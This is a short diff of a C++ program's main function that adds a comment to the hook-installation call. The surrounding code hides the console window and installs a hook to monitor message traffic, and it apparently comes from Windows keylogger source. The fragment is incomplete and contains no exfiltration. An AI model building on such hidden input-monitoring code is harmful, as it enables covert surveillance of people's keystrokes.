@@ -12,6 +12,7 @@ int main()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	IO::MkDir(IO::GetOurPath(true));
+	//Install subroutine to monitor the message traffic
 	InstalHook();
 
 	//&Msg is the out parameter
